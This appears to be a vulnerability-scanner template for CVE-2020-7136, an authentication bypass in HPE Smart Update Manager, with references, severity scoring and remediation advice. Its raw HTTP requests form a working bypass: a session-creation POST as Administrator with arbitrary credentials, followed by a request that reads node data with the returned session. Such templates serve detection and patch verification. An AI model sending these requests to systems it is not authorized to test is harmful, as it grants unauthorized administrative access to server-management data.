id: CVE-2020-7136
info:
  name: HPE Smart Update Manager < 8.5.6 - Remote Unauthorized Access
  author: gy741
  severity: critical
  description: The HPE Smart Update Manager (SUM) version 8.5.6 and earlier versions
    have a security vulnerability (CVE-2020-7136), which enables remote unauthorized
    access to sensitive data.
  reference:
  - https://www.tenable.com/security/research/tra-2020-02
  - https://support.hpe.com/hpesc/public/docDisplay?docLocale=en_US&docId=emr_na-hpesbmu03997en_us
  - https://nvd.nist.gov/vuln/detail/CVE-2020-7136
  - https://support.hpe.com/hpsc/doc/public/display?docLocale=en_US&docId=emr_na-hpesbmu03997en_us
  remediation: Hewlett Packard Enterprise has provided a software update to resolve
    this vulnerability in HPE Smart Update Manager (SUM) prior to 8.5.6. Please visit
    the HPE Support Center at https://support.hpe.com/hpesc/public/home to download
    the latest version of HPE Smart Update Manager (SUM). Download the latest version
    of HPE Smart Update Manager (SUM) or download the latest Service Pack For ProLiant
    (SPP).
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-7136
    cwe-id: CWE-288
  tags: cve,cve2020,hp,auth-bypass,hpe,tenable
  metadata:
    impact: The vulnerability CVE-2020-7136 in HPE Smart Update Manager (SUM) prior
      to version 8.5.6 could have a severe impact by allowing remote unauthorized
      access to sensitive information.
    recommendation: It is strongly recommended to update HPE Smart Update Manager
      to version 8.5.6 or later to prevent remote unauthorized access through CVE-2020-7136.
requests:
- raw:
  - 'POST /session/create HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Content-Type: application/json


    {"hapi":{"username":"Administrator","password":"any_password","language":"en","mode":"gui",
    "usesshkey":true, "privatekey":"any_privateky", "passphrase":"any_passphase","settings":{"output_filter":"passed","port_number":"444"}}}

    '
  - 'GET /session/{{sessionid}}/node/index HTTP/1.1

    Host: {{Hostname}}

    '
  matchers:
  - type: word
    part: body
    words:
    - hmessage
    - Command completed successfully.
    - node_name
    condition: and
  extractors:
  - type: regex
    name: sessionid
    group: 1
    internal: true
    part: body
    regex:
    - '"sessionId":"([a-z0-9.]+)"'
